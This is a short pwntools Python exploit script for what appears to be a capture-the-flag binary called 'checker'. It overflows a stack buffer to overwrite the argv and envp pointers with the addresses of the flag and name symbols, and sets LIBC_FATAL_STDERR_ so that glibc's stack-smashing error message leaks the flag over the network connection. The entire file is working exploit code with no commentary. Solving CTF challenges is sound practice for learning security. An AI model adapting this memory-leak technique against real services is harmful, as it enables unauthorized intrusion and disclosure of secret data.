#!/usr/bin/env python
from pwn import *

rhp = {'host':"localhost", 'port':8080}

context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

binf = ELF('./checker')
addr_flag   = binf.symbols['flag']
addr_name   = binf.symbols['name']

#==========

def attack(conn):
    conn.recvuntil('NAME : ')
    conn.sendline('LIBC_FATAL_STDERR_=1')
    
    # set envp
    for i in range(7,3,-1):
        conn.recvuntil('>> ')
        conn.sendline('a'*(0x188+i))
    conn.recvuntil('>> ')
    conn.sendline('a'*0x188+p64(addr_name))
        
    # set argv
    for i in range(7,3,-1):
        conn.recvuntil('>> ')
        conn.sendline('a'*(0x178+i))
    conn.recvuntil('>> ')
    conn.sendline('a'*0x178+p64(addr_flag))

    conn.recvuntil('>> ')
    conn.sendline('yes')
    
    conn.recvuntil('FLAG : ')
    conn.sendline('flag')

    s = conn.read()
    m = re.search(r': ([^\s]+)', s)
    info('FLAG : %s' % m.group(1))

#==========

if __name__=='__main__':
    conn = remote(rhp['host'], rhp['port'])
    attack(conn)
    
#==========
